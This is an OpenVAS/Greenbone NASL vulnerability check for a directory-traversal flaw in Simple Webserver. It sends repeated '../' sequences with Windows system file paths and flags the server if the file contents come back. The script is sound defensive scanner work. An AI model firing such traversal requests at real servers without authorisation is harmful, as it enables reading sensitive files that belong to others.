if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103632" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Simple Webserver Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/119239/Simple-Webserver-2.3-rc1-Directory-Traversal.html" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-01-04 10:25:13 +0100 (Fri, 04 Jan 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "PMSoftware-SWS/banner" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "summary", value: "Simple Webserver is prone to a directory-traversal vulnerability because it
fails to properly sanitize user-supplied input.

Remote attackers can use specially crafted requests with directory-
traversal sequences ('../') to retrieve arbitrary files in the context
of the application.

Exploiting this issue may allow an attacker to obtain sensitive
information that could aid in further attacks." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(banner && !ContainsString( banner, "Server: PMSoftware-SWS" )){
	exit( 0 );
}
files = traversal_files( "windows" );
for file in keys( files ) {
	req = NASLString( "GET ", crap( data: "../", length: 9 * 6 ), files[file], " HTTP/1.1\\r\\n\\r\\n" );
	result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(eregmatch( pattern: file, string: result )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 0 );

